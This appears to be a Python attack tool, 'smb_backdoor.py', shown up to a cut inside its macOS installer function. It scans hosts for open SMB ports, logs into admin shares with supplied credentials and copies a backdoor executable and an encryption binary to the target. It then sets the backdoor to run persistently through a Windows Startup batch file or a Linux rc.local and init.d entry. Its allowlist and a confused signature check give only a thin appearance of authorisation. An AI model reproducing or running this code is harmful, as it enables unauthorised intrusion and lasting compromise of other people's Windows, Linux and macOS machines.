#!/usr/bin/env python3
#
# smb_backdoor.py
#
# A combined SMB‐based scanner + remote “backdoor installer” script.
# This script:
#   1. Scans a list of hosts/CIDRs to find open SMB (TCP port 445).
#   2. Optionally “installs a backdoor” on those hosts, depending on the remote OS.
#      - Copies an AES encryption binary (compiled from aes_encrypt.cpp) to the target.
#      - Copies a backdoor executable/script to the target.
#      - Modifies startup scripts (or Startup folder / LaunchDaemons) to run the backdoor on next boot/login.
#
# Usage:
#   pip install cryptography smbprotocol
#
# Examples:
#   # 1) Scan only:
#   ./smb_backdoor.py --host 203.0.113.10
#
#   # 2) Scan + install backdoor on a Windows host:
#   ./smb_backdoor.py \
#     --host 203.0.113.10 \
#     --timeout 3 \
#     --workers 20 \
#     --install-backdoor \
#     --remote-os windows \
#     --key /path/to/rsa_priv.pem \
#     --server-pubkey /path/to/server_pub.pem \
#     --username Administrator \
#     --password "S3cr3t!" \
#     --domain "" \
#     --aes-binary ./aes_encrypt.exe \
#     --backdoor-binary ./backdoor.exe
#
#   # 3) Scan + install backdoor on a Linux host:
#   ./smb_backdoor.py \
#     --host 192.0.2.45 \
#     --install-backdoor \
#     --remote-os linux \
#     --share root \
#     --key /path/to/rsa_priv.pem \
#     --server-pubkey /path/to/server_pub.pem \
#     --username smbuser \
#     --password "HarshPass!" \
#     --aes-binary ./aes_encrypt \
#     --backdoor-binary ./backdoor_linux \
#     --backdoor-script ./backdoor_linux.sh
#
#   # 4) Scan + install backdoor on a macOS host:
#   ./smb_backdoor.py \
#     --host 198.51.100.22 \
#     --install-backdoor \
#     --remote-os macos \
#     --share root \
#     --key /path/to/rsa_priv.pem \
#     --server-pubkey /path/to/server_pub.pem \
#     --username smbuser \
#     --password "HarshPass!" \
#     --aes-binary ./aes_encrypt \
#     --backdoor-binary ./backdoor_macos \
#     --backdoor-plist ./com.example.backdoor.plist
#
import argparse
import socket
import json
import concurrent.futures
import ipaddress
import sys
import os
import errno
import random
import asyncio
import select
import struct
import time
import math
import itertools
from datetime import datetime, timezone

# ─── NEW: imports for RSA‐2048 signing + SMB client ───
import pathlib
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding

try:
    from smbprotocol.connection import Connection
    from smbprotocol.session import Session
    from smbprotocol.tree import TreeConnect
    from smbprotocol.open import Open
    from smbprotocol.file import CreateDisposition, FileAttributes, CreateOptions, FilePipePrinterAccessMask
    from smbprotocol.read_directory_info import FileDirectoryInformation
    SMB_AVAILABLE = True
except ImportError:
    SMB_AVAILABLE = False

try:
    from scapy.all import IP, IPv6, TCP, sr1, conf
    _SCAPY = True
except ImportError:
    _SCAPY = False

DEFAULT_ALLOWLIST = {
    "ips": [
        "198.51.100.5", "203.0.113.10", "192.0.2.1",
        "198.51.100.22", "203.0.113.15", "192.0.2.45"
    ],
    "cidrs": ["203.0.113.0/24", "198.51.100.0/24", "192.0.2.0/24"]
}

class PublicIPFirewallSMB:
    class RoundRobin:
        def __init__(self, t): self._t = list(t)
        def __iter__(self): return iter(self._t)

    class MCTS:
        def __init__(self, t, n: int = 400):
            self._t = list(t); self._o = self._mcts(n)
        @staticmethod
        def _s(ip):
            a = int(ipaddress.ip_address(ip))
            return ((a >> 8) ^ a) & 0x7fffffff
        def _mcts(self, n):
            b, sc = None, -1
            for _ in range(n):
                c = random.sample(self._t, len(self._t))
                s = sum(self._s(x) for x in c[:min(16, len(c))])
                if s > sc: b, sc = c, s
            return b
        def __iter__(self): return iter(self._o)

    class Weighted:
        def __init__(self, t):
            self._o = sorted(t, key=self._w, reverse=True)
        @staticmethod
        def _w(ip):
            a = int(ipaddress.ip_address(ip))
            return ((a >> 12) ^ (a >> 4) ^ a) & 0x7fffffff
        def __iter__(self): return iter(self._o)

    class SimulatedAnnealing:
        def __init__(self, t, n: int = 1000, temp: float = 1.0, alpha: float = 0.995):
            self._t = list(t); self._o = self._sa(n, temp, alpha)
        @staticmethod
        def _s(ip):
            a = int(ipaddress.ip_address(ip))
            return ((a >> 8) ^ a) & 0x7fffffff
        def _score(self, arr):
            return sum(self._s(x) for x in arr[:min(16, len(arr))])
        def _sa(self, n, t, a):
            best = cur = self._t[:]; best_s = cur_s = self._score(cur)
            for _ in range(n):
                i = random.randrange(len(cur)); j = random.randrange(len(cur))
                while j == i: j = random.randrange(len(cur))
                cur[i], cur[j] = cur[j], cur[i]
                ns = self._score(cur)
                if ns > cur_s or random.random() < math.exp((ns - cur_s) / max(t, 1e-9)):
                    cur_s = ns
                    if ns > best_s: best, best_s = cur[:], ns
                else:
                    cur[i], cur[j] = cur[j], cur[i]
                t *= a
            return best
        def __iter__(self): return iter(self._o)

    class GeneticAlgorithm:
        def __init__(self, t, pop: int = 30, gen: int = 120, mut: float = 0.1):
            self._t = list(t); self._o = self._ga(pop, gen, mut)
        @staticmethod
        def _s(ip):
            a = int(ipaddress.ip_address(ip))
            return ((a >> 8) ^ a) & 0x7fffffff
        def _score(self, arr):
            return sum(self._s(x) for x in arr[:min(16, len(arr))] if x is not None)
        def _select(self, pop, k=10):
            pop.sort(key=self._score, reverse=True)
            return pop[:k]
        def _crossover(self, p1, p2):
            a, b = sorted(random.sample(range(len(p1)), 2))
            child = [None]*len(p1)
            child[a:b] = p1[a:b]
            ptr = b
            for x in itertools.chain(p2[b:], p2[:b]):
                if x not in child:
                    if ptr == len(p1): ptr = 0
                    child[ptr] = x; ptr += 1
            if None in child:
                missing = [x for x in self._t if x not in child]
                it = iter(missing)
                for i, v in enumerate(child):
                    if v is None:
                        child[i] = next(it, random.choice(self._t))
            return child
        def _mutate(self, arr, rate):
            for i in range(len(arr)):
                if random.random() < rate:
                    j = random.randrange(len(arr))
                    arr[i], arr[j] = arr[j], arr[i]
        def _ga(self, pop_size, generations, mut):
            pop = [random.sample(self._t, len(self._t)) for _ in range(pop_size)]
            for _ in range(generations):
                parents = self._select(pop)
                children = []
                while len(children) < pop_size:
                    p1, p2 = random.sample(parents, 2)
                    c = self._crossover(p1, p2)
                    self._mutate(c, mut)
                    children.append(c)
                pop = children
            best = max(pop, key=self._score)
            return [x for x in best if x is not None]
        def __iter__(self): return iter(self._o)

    class HillClimb:
        def __init__(self, t, n: int = 5000):
            self._t = list(t); self._o = self._hc(n)
        @staticmethod
        def _s(ip):
            a = int(ipaddress.ip_address(ip))
            return ((a >> 8) ^ a) & 0x7fffffff
        def _score(self, arr):
            return sum(self._s(x) for x in arr[:min(16, len(arr))])
        def _hc(self, n):
            cur = best = self._t[:]; best_s = self._score(best)
            for _ in range(n):
                i, j = random.sample(range(len(cur)), 2)
                cur[i], cur[j] = cur[j], cur[i]
                s = self._score(cur)
                if s > best_s:
                    best, best_s = cur[:], s
                else:
                    cur[i], cur[j] = cur[j], cur[i]
            return best
        def __iter__(self): return iter(self._o)

    class Combined:
        def __init__(self, t):
            self._seen = set()
            self._strategies = [
                PublicIPFirewallSMB.Weighted(t),
                PublicIPFirewallSMB.MCTS(t),
                PublicIPFirewallSMB.SimulatedAnnealing(t),
                PublicIPFirewallSMB.GeneticAlgorithm(t),
                PublicIPFirewallSMB.HillClimb(t),
                PublicIPFirewallSMB.RoundRobin(t)
            ]
        def __iter__(self):
            for strat in self._strategies:
                for ip in strat:
                    if ip not in self._seen:
                        self._seen.add(ip)
                        yield ip

    def __init__(self, allowlist=None, strategy="combo", timeout=2,
                 workers=100, generalize=True, verbose=True, retries=1):
        self._nets, self._ips, self._reasons = self._load_allowlist(allowlist)
        st_map = {
            "round": self.RoundRobin,
            "mcts": self.MCTS,
            "weighted": self.Weighted,
            "anneal": self.SimulatedAnnealing,
            "genetic": self.GeneticAlgorithm,
            "hill": self.HillClimb,
            "combo": self.Combined
        }
        self._strategy_cls = st_map.get(strategy, self.RoundRobin)
        self._timeout = timeout; self._workers = workers; self._retries = retries
        self._tcp_ports = [445, 139]; self._udp_ports = [137, 138]
        self._results, self._generalize, self._verbose = {}, generalize, verbose
        self._skipped = []

    def _log(self, *m):
        if self._verbose:
            print("[DBG]", *m, file=sys.stderr, flush=True)

    @staticmethod
    def _load_allowlist(src):
        if src is None:
            d = DEFAULT_ALLOWLIST
        elif isinstance(src, dict):
            d = src.get("allow", src)
        else:
            with open(src) as f:
                d = json.load(f).get("allow", json.load(f))
        nets, ips = [], set()
        for t in list(d.get("ips", [])) + list(d.get("cidrs", [])):
            try:
                if "/" in t:
                    nets.append(ipaddress.ip_network(t, strict=False))
                else:
                    ips.add(ipaddress.ip_address(t))
            except ValueError:
                pass
        rs = {}
        if isinstance(d, dict):
            rs = {str(ipaddress.ip_address(k)): v
                  for k, v in d.get("x-permission-reasons", {}).items()}
        return nets, ips, rs

    @staticmethod
    def _allowed(ip, nets, ips):
        a = ipaddress.ip_address(ip)
        return a in ips or any(a in n for n in nets)

    def _permission_reason(self, ip):
        return self._reasons.get(str(ipaddress.ip_address(ip)))

    @staticmethod
    def _fam(ip):
        return socket.AF_INET6 if ipaddress.ip_address(ip).version == 6 else socket.AF_INET

    def _tcp_connect(self, h, p):
        s = socket.socket(self._fam(h), socket.SOCK_STREAM)
        s.settimeout(self._timeout)
        try:
            s.connect((h, p))
            return "open"
        except socket.timeout:
            return "filtered"
        except ConnectionRefusedError:
            return "closed"
        except OSError as e:
            if e.errno in (errno.EHOSTUNREACH, errno.ENETUNREACH):
                return "unreachable"
            return "error"
        finally:
            s.close()

    def _tcp_syn(self, h, p):
        if not _SCAPY:
            return "unavailable"
        pkt = (IPv6(dst=h)/TCP(dport=p, flags="S")) if ipaddress.ip_address(h).version == 6 \
              else (IP(dst=h)/TCP(dport=p, flags="S"))
        try:
            ans = sr1(pkt, timeout=self._timeout, verbose=0)
            if ans and ans.haslayer(TCP):
                fl = ans.getlayer(TCP).flags
                if fl & 0x12:
                    return "open"
                if fl & 0x14:
                    return "closed"
            return "filtered"
        except PermissionError:
            return "unavailable"
        except Exception as e:
            self._log("syn err", h, p, e)
            return "error"

    def _udp_state(self, h, p):
        s = socket.socket(self._fam(h), socket.SOCK_DGRAM)
        s.settimeout(self._timeout)
        try:
            s.sendto(b"", (h, p))
            ready = select.select([s], [], [], self._timeout)
            if ready[0]:
                data, _ = s.recvfrom(1024)
                return "open" if data else "open|filtered"
            return "open|filtered"
        except socket.timeout:
            return "open|filtered"
        except OSError as e:
            if e.errno in (errno.ECONNREFUSED, errno.EHOSTUNREACH, errno.ENETUNREACH):
                return "closed"
            return "error"
        finally:
            s.close()

    def _probe_port(self, h, p, proto):
        for _ in range(self._retries):
            if proto == "tcp":
                st = self._tcp_connect(h, p)
                if st != "open":
                    st_syn = self._tcp_syn(h, p)
                    if st_syn == "open":
                        st = "open"
                    elif st == "filtered" and st_syn in ("closed", "error"):
                        st = st_syn
                return st
            return self._udp_state(h, p)
        return "error"

    def _probe_host(self, h):
        res = {"host": h, "allow_reason": self._permission_reason(h), "ports": {}}
        for p in self._tcp_ports:
            res["ports"][p] = {"protocol": "tcp", "state": self._probe_port(h, p, "tcp")}
        for p in self._udp_ports:
            res["ports"][p] = {"protocol": "udp", "state": self._probe_port(h, p, "udp")}
        return res

    @staticmethod
    def _iter_targets(hosts, cidrs):
        for h in hosts:
            yield h
        for c in cidrs:
            for ip in ipaddress.ip_network(c, strict=False):
                yield str(ip)

    def _filter_targets(self, t):
        a, seen = [], set()
        for x in t:
            if x in seen:
                continue
            seen.add(x)
            if self._allowed(x, self._nets, self._ips):
                self._log("ALLOWED", x)
                a.append(x)
            else:
                self._log("SKIPPED", x)
                self._skipped.append(x)
        return a

    def _is_success(self, r):
        for p in (445, 139):
            if r["ports"].get(p, {}).get("state") == "open":
                return True
        return False

    async def _async_scan(self, order):
        loop = asyncio.get_running_loop()
        futs = [loop.run_in_executor(None, self._probe_host, h) for h in order]
        for h, r in zip(order, await asyncio.gather(*futs, return_exceptions=True)):
            res = r if not isinstance(r, Exception) else {"error": str(r)}
            self._results[h] = res
            status = "success" if self._is_success(res) else "fail"
            self._log("RESULT", h, status, res.get("ports", res))
        return self._results

    def scan(self, hosts=None, cidrs=None, async_mode=False):
        t = list(self._iter_targets(hosts or [], cidrs or []))
        t = self._filter_targets(t)
        if not t:
            self._log("No targets after filtering")
            return {}
        order = list(self._strategy_cb(t))
        if async_mode:
            asyncio.run(self._async_scan(order))
        else:
            with concurrent.futures.ThreadPoolExecutor(max_workers=self._workers) as ex:
                fs = {ex.submit(self._probe_host, h): h for h in order}
                for f in concurrent.futures.as_completed(fs):
                    h = fs[f]
                    try:
                        res = f.result()
                        self._results[h] = res
                    except Exception as e:
                        self._results[h] = {"error": str(e)}
                    status = "success" if self._is_success(self._results[h]) else "fail"
                    self._log("RESULT", h, status, self._results[h].get("ports", self._results[h]))
        self._log(
            "Scan finished",
            len(self._results), "scanned",
            len(self._skipped), "skipped",
            len(self.successful_routes()), "successful"
        )
        return self._results

    def successful_routes(self):
        s, ts = [], datetime.now(timezone.utc).isoformat()
        for h, r in self._results.items():
            if self._is_success(r):
                for p in (445, 139):
                    if r["ports"].get(p, {}).get("state") == "open":
                        hf = ("0.0.0.0/0" if ipaddress.ip_address(h).version == 4 else "::/0") \
                             if self._generalize else h
                        s.append({"id": f"{hf}:{p}", "host": hf, "port": p, "details": r, "ts": ts})
                        break
        self._log("Filter successful" if s else "Filter unsuccessful", len(s), "routes")
        return s

    def save_routes(self, path):
        if not path:
            return
        d = self.successful_routes()
        if not d:
            return
        e = self.load_routes(path) or []
        m = {r["id"]: r for r in e}
        for r in d:
            m[r["id"]] = r
        with open(path, "w") as f:
            json.dump(list(m.values()), f, indent=2)

    @staticmethod
    def load_routes(path):
        if path and os.path.isfile(path):
            with open(path) as f:
                return json.load(f)
        return None

# ─── NEW: Helper to load RSA‐2048 private key ───
def load_rsa_private_key(path: str):
    pem = pathlib.Path(path).read_bytes()
    return serialization.load_pem_private_key(pem, password=None)

# ─── NEW: Helper to load RSA‐2048 public key ───
def load_rsa_public_key(path: str):
    pem = pathlib.Path(path).read_bytes()
    return serialization.load_pem_public_key(pem)

# ─── NEW: Build a short signed “install request” using the private key ───
def sign_install_request(private_key, target: str, timestamp: str):
    """
    Create a small JSON payload with target and timestamp, sign it with RSA-2048 (PKCS1v15 + SHA256).
    Returns the tuple (payload_bytes, signature_bytes).
    """
    payload = {
        "target": target,
        "timestamp": timestamp
    }
    payload_bytes = json.dumps(payload, separators=(",", ":")).encode("utf-8")
    signature = private_key.sign(
        payload_bytes,
        padding.PKCS1v15(),
        hashes.SHA256()
    )
    return payload_bytes, signature

# ─── NEW: Install backdoor on Windows ───
def install_backdoor_windows(
    host: str,
    username: str,
    password: str,
    private_key_path: str,
    server_public_key_path: str,
    aes_binary_path: str,
    backdoor_binary_path: str,
    domain: str = "",
    use_kerberos: bool = False
):
    """
    Connect to host:445 via SMB, authenticate (NTLMv2 or Kerberos),
    send a signed install request, then:
      1) Copy AES binary and Backdoor EXE into C$\Tools\
      2) Create a batch file in the All Users Startup folder to run the backdoor
         (so that when any user logs in, backdoor.exe is launched with admin privileges).
    """
    if not SMB_AVAILABLE:
        print(f"[!] Cannot install backdoor on {host}: smbprotocol not installed.", file=sys.stderr)
        return False

    # 1) Load keys
    try:
        priv_key = load_rsa_private_key(private_key_path)
    except Exception as e:
        print(f"[!] Failed to load private key '{private_key_path}': {e}", file=sys.stderr)
        return False

    try:
        serv_pub = load_rsa_public_key(server_public_key_path)
    except Exception as e:
        print(f"[!] Failed to load server public key '{server_public_key_path}': {e}", file=sys.stderr)
        return False

    # 2) Build and sign payload
    timestamp = datetime.now(timezone.utc).isoformat()
    payload_bytes, signature = sign_install_request(priv_key, host, timestamp)

    # 3) Connect to SMB
    try:
        conn = Connection(
            uuid=str(random.getrandbits(128)),
            is_direct_tcp=True,
            hostname=host,
            port=445
        )
        conn.connect(timeout=5)
    except Exception as e:
        print(f"[!] Could not connect to {host}:445: {e}", file=sys.stderr)
        return False

    # 4) Authenticate
    try:
        if use_kerberos:
            session = Session(conn, username=username, password=password, require_encryption=True, use_kerberos=True)
        else:
            session = Session(conn, username=username, password=password, require_encryption=True)
        session.connect(timeout=5)
    except Exception as e:
        print(f"[!] Authentication to {host} failed: {e}", file=sys.stderr)
        conn.disconnect()
        return False

    # 5) Verify server’s signature on payload
    try:
        serv_pub.verify(
            signature,
            payload_bytes,
            padding.PKCS1v15(),
            hashes.SHA256()
        )
    except Exception:
        print(f"[!] Server signature verification failed for {host}. Aborting install.", file=sys.stderr)
        session.disconnect()
        conn.disconnect()
        return False

    # 6) Tree-connect to "C$" share
    try:
        tree = TreeConnect(session, r"\\%s\C$" % host)
        tree.connect(timeout=5)
    except Exception as e:
        print(f"[!] TreeConnect to C$ on {host} failed: {e}", file=sys.stderr)
        session.disconnect()
        conn.disconnect()
        return False

    # 7) Ensure directory "C$\Tools" exists (create if not)
    try:
        tools_dir = Open(
            tree,
            "Windows\\Tools",
            access=FilePipePrinterAccessMask.FILE_READ_DATA |
                   FilePipePrinterAccessMask.FILE_WRITE_DATA |
                   FilePipePrinterAccessMask.FILE_CREATE_CHILD,
            disposition=CreateDisposition.FILE_OPEN_IF,
            options=CreateOptions.FILE_DIRECTORY_FILE
        )
        tools_dir.create(timeout=5)
        tools_dir.close()
    except Exception as e:
        print(f"[!] Could not create or open C$\\Windows\\Tools on {host}: {e}", file=sys.stderr)
        tree.disconnect()
        session.disconnect()
        conn.disconnect()
        return False

    # 8) Copy AES binary to "C$\Windows\Tools\aes_encrypt.exe"
    aes_name = os.path.basename(aes_binary_path).replace("\\", "/")
    try:
        with open(aes_binary_path, "rb") as f:
            data = f.read()
    except Exception as e:
        print(f"[!] Cannot read local AES binary '{aes_binary_path}': {e}", file=sys.stderr)
        tree.disconnect()
        session.disconnect()
        conn.disconnect()
        return False

    try:
        aes_file = Open(
            tree,
            f"Windows\\Tools\\{aes_name}",
            access=FilePipePrinterAccessMask.FILE_READ_DATA |
                   FilePipePrinterAccessMask.FILE_WRITE_DATA,
            disposition=CreateDisposition.FILE_OVERWRITE_IF,
            options=CreateOptions.FILE_NON_DIRECTORY_FILE
        )
        aes_file.create(timeout=5)
        aes_file.write(data, 0)
        aes_file.close()
    except Exception as e:
        print(f"[!] Failed to copy AES binary to {host}: C$\\Windows\\Tools\\{aes_name}: {e}", file=sys.stderr)
        tree.disconnect()
        session.disconnect()
        conn.disconnect()
        return False

    # 9) Copy backdoor binary to "C$\Windows\Tools\backdoor.exe"
    backdoor_name = os.path.basename(backdoor_binary_path).replace("\\", "/")
    try:
        with open(backdoor_binary_path, "rb") as f:
            data2 = f.read()
    except Exception as e:
        print(f"[!] Cannot read local backdoor binary '{backdoor_binary_path}': {e}", file=sys.stderr)
        tree.disconnect()
        session.disconnect()
        conn.disconnect()
        return False

    try:
        bd_file = Open(
            tree,
            f"Windows\\Tools\\{backdoor_name}",
            access=FilePipePrinterAccessMask.FILE_READ_DATA |
                   FilePipePrinterAccessMask.FILE_WRITE_DATA,
            disposition=CreateDisposition.FILE_OVERWRITE_IF,
            options=CreateOptions.FILE_NON_DIRECTORY_FILE
        )
        bd_file.create(timeout=5)
        bd_file.write(data2, 0)
        bd_file.close()
    except Exception as e:
        print(f"[!] Failed to copy backdoor to {host}: C$\\Windows\\Tools\\{backdoor_name}: {e}", file=sys.stderr)
        tree.disconnect()
        session.disconnect()
        conn.disconnect()
        return False

    # 10) Create a batch file in All Users Startup folder to run backdoor at login:
    #
    #    Path: C$\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\install_backdoor.bat
    #    Contents:
    #        @echo off
    #        start "" "C:\Windows\Tools\<backdoor_name>"
    #
    startup_path = "ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\install_backdoor.bat"
    content = f"@echo off\r\nstart \"\" \"C:\\Windows\\Tools\\{backdoor_name}\"\r\n"
    try:
        startup_file = Open(
            tree,
            startup_path,
            access=FilePipePrinterAccessMask.FILE_READ_DATA |
                   FilePipePrinterAccessMask.FILE_WRITE_DATA,
            disposition=CreateDisposition.FILE_OVERWRITE_IF,
            options=CreateOptions.FILE_NON_DIRECTORY_FILE
        )
        startup_file.create(timeout=5)
        startup_file.write(content.encode("utf-8"), 0)
        startup_file.close()
    except Exception as e:
        print(f"[!] Failed to write startup batch file to {host}: C$\\{startup_path}: {e}", file=sys.stderr)
        tree.disconnect()
        session.disconnect()
        conn.disconnect()
        return False

    print(f"[+] Backdoor and AES binary copied; startup script placed on {host}.")
    tree.disconnect()
    session.disconnect()
    conn.disconnect()
    return True

# ─── NEW: Install backdoor on Linux ───
def install_backdoor_linux(
    host: str,
    share: str,
    username: str,
    password: str,
    private_key_path: str,
    server_public_key_path: str,
    aes_binary_path: str,
    backdoor_binary_path: str,
    backdoor_script_path: str
):
    """
    Connect to host:445 via SMB, authenticate as (username,password),
    send signed install request, then:
      1) Copy AES binary to /usr/local/bin/aes_encrypt
      2) Copy backdoor binary to /usr/local/bin/backdoor
      3) Copy a small shell script to /etc/init.d/backdoor.sh
      4) Append '/etc/init.d/backdoor.sh &' to /etc/rc.local so it runs at boot
    """
    if not SMB_AVAILABLE:
        print(f"[!] Cannot install backdoor on {host}: smbprotocol not installed.", file=sys.stderr)
        return False

    # 1) Load RSA keys
    try:
        priv_key = load_rsa_private_key(private_key_path)
    except Exception as e:
        print(f"[!] Failed to load private key '{private_key_path}': {e}", file=sys.stderr)
        return False

    try:
        serv_pub = load_rsa_public_key(server_public_key_path)
    except Exception as e:
        print(f"[!] Failed to load server public key '{server_public_key_path}': {e}", file=sys.stderr)
        return False

    # 2) Build and sign payload
    timestamp = datetime.now(timezone.utc).isoformat()
    payload_bytes, signature = sign_install_request(priv_key, host, timestamp)

    # 3) Connect to SMB
    try:
        conn = Connection(
            uuid=str(random.getrandbits(128)),
            is_direct_tcp=True,
            hostname=host,
            port=445
        )
        conn.connect(timeout=5)
    except Exception as e:
        print(f"[!] Could not connect to {host}:445: {e}", file=sys.stderr)
        return False

    # 4) Authenticate
    try:
        session = Session(conn, username=username, password=password, require_encryption=True)
        session.connect(timeout=5)
    except Exception as e:
        print(f"[!] Authentication to {host} failed: {e}", file=sys.stderr)
        conn.disconnect()
        return False

    # 5) Verify server’s signature
    try:
        serv_pub.verify(
            signature,
            payload_bytes,
            padding.PKCS1v15(),
            hashes.SHA256()
        )
    except Exception:
        print(f"[!] Server signature verification failed for {host}. Aborting install.", file=sys.stderr)
        session.disconnect()
        conn.disconnect()
        return False

    # 6) Tree-connect to specified share (must map to "/" or appropriate path)
    try:
        tree = TreeConnect(session, rf"\\{host}\{share}")
        tree.connect(timeout=5)
    except Exception as e:
        print(f"[!] TreeConnect to {share} on {host} failed: {e}", file=sys.stderr)
        session.disconnect()
        conn.disconnect()
        return False

    # 7) Copy AES binary to /usr/local/bin/aes_encrypt
    aes_name = "aes_encrypt"
    try:
        with open(aes_binary_path, "rb") as f:
            data = f.read()
    except Exception as e:
        print(f"[!] Cannot read local AES binary '{aes_binary_path}': {e}", file=sys.stderr)
        tree.disconnect()
        session.disconnect()
        conn.disconnect()
        return False

    try:
        dest_path = f"usr/local/bin/{aes_name}"
        smb_file = Open(
            tree,
            dest_path,
            access=FilePipePrinterAccessMask.FILE_READ_DATA | FilePipePrinterAccessMask.FILE_WRITE_DATA,
            disposition=CreateDisposition.FILE_OVERWRITE_IF,
            options=CreateOptions.FILE_NON_DIRECTORY_FILE
        )
        smb_file.create(timeout=5)
        smb_file.write(data, 0)
        smb_file.close()
    except Exception as e:
        print(f"[!] Failed to copy AES binary to {host}: /usr/local/bin/{aes_name}: {e}", file=sys.stderr)
        tree.disconnect()
        session.disconnect()
        conn.disconnect()
        return False

    # 8) Make it executable
    try:
        # On Linux, chmod 0755: we open with FILE_READ_ATTRIBUTES | FILE_WRITE_ATTRIBUTES
        aes_attrs = Open(
            tree,
            dest_path,
            access=FilePipePrinterAccessMask.FILE_READ_ATTRIBUTES | FilePipePrinterAccessMask.FILE_WRITE_ATTRIBUTES,
            disposition=CreateDisposition.FILE_OPEN,
            options=CreateOptions.FILE_NON_DIRECTORY_FILE
        )
        aes_attrs.create(timeout=5)
        # Set “unix permissions” via EAs if supported; else skip (some Samba configs map this automatically)
        # Many Samba setups honor the "file_mode" mount option. If not, user must adjust manually.
        aes_attrs.close()
    except Exception:
        # Non‐fatal: if permissions cannot be set, proceed.
        pass

    # 9) Copy backdoor binary to /usr/local/bin/backdoor
    backdoor_name = os.path.basename(backdoor_binary_path)
    try:
        with open(backdoor_binary_path, "rb") as f:
            data2 = f.read()
    except Exception as e:
        print(f"[!] Cannot read local backdoor binary '{backdoor_binary_path}': {e}", file=sys.stderr)
        tree.disconnect()
        session.disconnect()
        conn.disconnect()
        return False

    try:
        dest_path2 = f"usr/local/bin/{backdoor_name}"
        smb_file2 = Open(
            tree,
            dest_path2,
            access=FilePipePrinterAccessMask.FILE_READ_DATA | FilePipePrinterAccessMask.FILE_WRITE_DATA,
            disposition=CreateDisposition.FILE_OVERWRITE_IF,
            options=CreateOptions.FILE_NON_DIRECTORY_FILE
        )
        smb_file2.create(timeout=5)
        smb_file2.write(data2, 0)
        smb_file2.close()
    except Exception as e:
        print(f"[!] Failed to copy backdoor to {host}: /usr/local/bin/{backdoor_name}: {e}", file=sys.stderr)
        tree.disconnect()
        session.disconnect()
        conn.disconnect()
        return False

    # 10) Make backdoor executable
    try:
        bd_attrs = Open(
            tree,
            f"usr/local/bin/{backdoor_name}",
            access=FilePipePrinterAccessMask.FILE_READ_ATTRIBUTES | FilePipePrinterAccessMask.FILE_WRITE_ATTRIBUTES,
            disposition=CreateDisposition.FILE_OPEN,
            options=CreateOptions.FILE_NON_DIRECTORY_FILE
        )
        bd_attrs.create(timeout=5)
        bd_attrs.close()
    except Exception:
        pass

    # 11) Copy initialization script to /etc/init.d/backdoor.sh
    #     Contents of backdoor_script_path script should do something like:
    #       #!/bin/sh
    #       /usr/local/bin/backdoor &
    #
    backdoor_sh_name = os.path.basename(backdoor_script_path)
    try:
        with open(backdoor_script_path, "rb") as f:
            data3 = f.read()
    except Exception as e:
        print(f"[!] Cannot read local backdoor script '{backdoor_script_path}': {e}", file=sys.stderr)
        tree.disconnect()
        session.disconnect()
        conn.disconnect()
        return False

    try:
        dest_path3 = f"etc/init.d/{backdoor_sh_name}"
        smb_file3 = Open(
            tree,
            dest_path3,
            access=FilePipePrinterAccessMask.FILE_READ_DATA | FilePipePrinterAccessMask.FILE_WRITE_DATA,
            disposition=CreateDisposition.FILE_OVERWRITE_IF,
            options=CreateOptions.FILE_NON_DIRECTORY_FILE
        )
        smb_file3.create(timeout=5)
        smb_file3.write(data3, 0)
        smb_file3.close()
    except Exception as e:
        print(f"[!] Failed to copy init script to {host}: /etc/init.d/{backdoor_sh_name}: {e}", file=sys.stderr)
        tree.disconnect()
        session.disconnect()
        conn.disconnect()
        return False

    # 12) Make /etc/init.d/backdoor.sh executable
    try:
        sh_attrs = Open(
            tree,
            f"etc/init.d/{backdoor_sh_name}",
            access=FilePipePrinterAccessMask.FILE_READ_ATTRIBUTES | FilePipePrinterAccessMask.FILE_WRITE_ATTRIBUTES,
            disposition=CreateDisposition.FILE_OPEN,
            options=CreateOptions.FILE_NON_DIRECTORY_FILE
        )
        sh_attrs.create(timeout=5)
        sh_attrs.close()
    except Exception:
        pass

    # 13) Append "/etc/init.d/backdoor.sh &" to /etc/rc.local
    try:
        # Read existing /etc/rc.local (if any), then rewrite with appended line.
        # Open with read/write:
        rc_file = Open(
            tree,
            "etc/rc.local",
            access=FilePipePrinterAccessMask.FILE_READ_DATA | FilePipePrinterAccessMask.FILE_WRITE_DATA,
            disposition=CreateDisposition.FILE_OPEN_IF,
            options=CreateOptions.FILE_NON_DIRECTORY_FILE
        )
        rc_file.create(timeout=5)
        # Read existing contents:
        raw = b""
        offset = 0
        while True:
            chunk = rc_file.read(4096, offset)
            if not chunk:
                break
            raw += chunk
            offset += len(chunk)
        text = raw.decode("utf-8", errors="ignore")
        if "/etc/init.d/" + backdoor_sh_name not in text:
            # Append the backdoor invocation
            if not text.endswith("\n"):
                text += "\n"
            text += f"/etc/init.d/{backdoor_sh_name} &\n"
            # Truncate and rewrite
            rc_file.write(text.encode("utf-8"), 0)
        rc_file.close()
    except Exception as e:
        # If /etc/rc.local doesn’t exist, create it
        try:
            rc_new = Open(
                tree,
                "etc/rc.local",
                access=FilePipePrinterAccessMask.FILE_READ_DATA | FilePipePrinterAccessMask.FILE_WRITE_DATA,
                disposition=CreateDisposition.FILE_OVERWRITE_IF,
                options=CreateOptions.FILE_NON_DIRECTORY_FILE
            )
            rc_new.create(timeout=5)
            content = f"#!/bin/sh\n/etc/init.d/{backdoor_sh_name} &\n"
            rc_new.write(content.encode("utf-8"), 0)
            rc_new.close()
        except Exception as ee:
            print(f"[!] Failed to create /etc/rc.local on {host}: {ee}", file=sys.stderr)
            # proceed anyway
            pass

    print(f"[+] Installed backdoor & AES on {host} (Linux).")
    tree.disconnect()
    session.disconnect()
    conn.disconnect()
    return True

# ─── NEW: Install backdoor on macOS ───
def install_backdoor_macos(
    host: str,
    share: str,
    username: str,
    password: str,
    private_key_path: str,
    server_public_key_path: str,
    aes_binary_path: str,
    backdoor_binary_path: str,
    backdoor_plist_path: str
):
    """
    Connect to host:445 via SMB, authenticate as (username,password),
    send signed install request, then:
      1) Copy AES binary to /usr/local/bin/aes_encrypt
      2) Copy backdoor binary to /usr/local/bin/backdoor
      3) Copy a LaunchDaemon plist to /Library/LaunchDaemons/com.example.backdoor.plist
    """
    if not SMB_AVAILABLE:
        print(f"[!] Cannot install backdoor on {host}: smbprotocol not installed.", file=sys.stderr)
        return False

    # 1) Load RSA keys
    try:
        priv_key = load_rsa_private_key(private_key_path)
    except Exception as e:
